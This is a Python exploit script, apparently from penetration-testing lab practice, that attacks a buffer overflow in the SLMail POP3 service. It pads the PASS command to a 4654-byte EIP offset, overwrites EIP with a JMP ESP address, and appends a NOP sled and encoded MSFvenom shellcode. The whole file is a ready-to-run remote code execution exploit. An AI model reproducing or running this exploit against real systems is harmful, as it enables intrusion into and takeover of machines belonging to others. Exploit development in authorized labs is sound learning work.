#!/usr/bin/python3

import socket
from struct import pack

# Global variables
IP = "192.168.0.51"
PORT = 110
OFFSET = 4654   # EIP Offset at 4654

def exploit():

    # Open a socket to connect to SLMail
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP,PORT))
    s.settimeout(2.0)

    print("[+] Sending shell payload...") 

    # Payload
    # Shell generated with MSFvenom - Shikata-ga-nai encoded - Badchars are \x00, \x0a, \x0d:
    buf =  b""
    buf += b"\xdb\xd1\xbe\xb9\xab\xfa\x95\xd9\x74\x24\xf4\x5b"
    buf += b"\x29\xc9\xb1\x52\x31\x73\x17\x83\xeb\xfc\x03\xca"
    buf += b"\xb8\x18\x60\xd0\x57\x5e\x8b\x28\xa8\x3f\x05\xcd"
    buf += b"\x99\x7f\x71\x86\x8a\x4f\xf1\xca\x26\x3b\x57\xfe"
    buf += b"\xbd\x49\x70\xf1\x76\xe7\xa6\x3c\x86\x54\x9a\x5f"
    buf += b"\x04\xa7\xcf\xbf\x35\x68\x02\xbe\x72\x95\xef\x92"
    buf += b"\x2b\xd1\x42\x02\x5f\xaf\x5e\xa9\x13\x21\xe7\x4e"
    buf += b"\xe3\x40\xc6\xc1\x7f\x1b\xc8\xe0\xac\x17\x41\xfa"
    buf += b"\xb1\x12\x1b\x71\x01\xe8\x9a\x53\x5b\x11\x30\x9a"
    buf += b"\x53\xe0\x48\xdb\x54\x1b\x3f\x15\xa7\xa6\x38\xe2"
    buf += b"\xd5\x7c\xcc\xf0\x7e\xf6\x76\xdc\x7f\xdb\xe1\x97"
    buf += b"\x8c\x90\x66\xff\x90\x27\xaa\x74\xac\xac\x4d\x5a"
    buf += b"\x24\xf6\x69\x7e\x6c\xac\x10\x27\xc8\x03\x2c\x37"
    buf += b"\xb3\xfc\x88\x3c\x5e\xe8\xa0\x1f\x37\xdd\x88\x9f"
    buf += b"\xc7\x49\x9a\xec\xf5\xd6\x30\x7a\xb6\x9f\x9e\x7d"
    buf += b"\xb9\xb5\x67\x11\x44\x36\x98\x38\x83\x62\xc8\x52"
    buf += b"\x22\x0b\x83\xa2\xcb\xde\x04\xf2\x63\xb1\xe4\xa2"
    buf += b"\xc3\x61\x8d\xa8\xcb\x5e\xad\xd3\x01\xf7\x44\x2e"
    buf += b"\xc2\x38\x30\x30\x1d\xd1\x43\x30\x30\xe0\xcd\xd6"
    buf += b"\x58\xf2\x9b\x41\xf5\x6b\x86\x19\x64\x73\x1c\x64"
    buf += b"\xa6\xff\x93\x99\x69\x08\xd9\x89\x1e\xf8\x94\xf3"
    buf += b"\x89\x07\x03\x9b\x56\x95\xc8\x5b\x10\x86\x46\x0c"
    buf += b"\x75\x78\x9f\xd8\x6b\x23\x09\xfe\x71\xb5\x72\xba"
    buf += b"\xad\x06\x7c\x43\x23\x32\x5a\x53\xfd\xbb\xe6\x07"
    buf += b"\x51\xea\xb0\xf1\x17\x44\x73\xab\xc1\x3b\xdd\x3b"
    buf += b"\x97\x77\xde\x3d\x98\x5d\xa8\xa1\x29\x08\xed\xde"
    buf += b"\x86\xdc\xf9\xa7\xfa\x7c\x05\x72\xbf\x9d\xe4\x56"
    buf += b"\xca\x35\xb1\x33\x77\x58\x42\xee\xb4\x65\xc1\x1a"
    buf += b"\x45\x92\xd9\x6f\x40\xde\x5d\x9c\x38\x4f\x08\xa2"
    buf += b"\xef\x70\x19"

    junk = b"A" * OFFSET    # To reach the EIP offset
    eip = pack("<L",0x5F4C4D13)     # JMP to the ESP address, converted to little endian
    esp = buf       # Shell code

    # FUZZ
    try:
        # Send the user
        s.send(b"USER test" + b'\r\n')

        # Send the password with malware
        s.send(b"PASS " + junk + eip + b"\x90"*32 + esp + b"\r\n")
        s.recv(1024)

    except TimeoutError:
        print("[!] Service crashed")

    finally:
        s.close()   # Closes the connection

if __name__ == "__main__":

    exploit()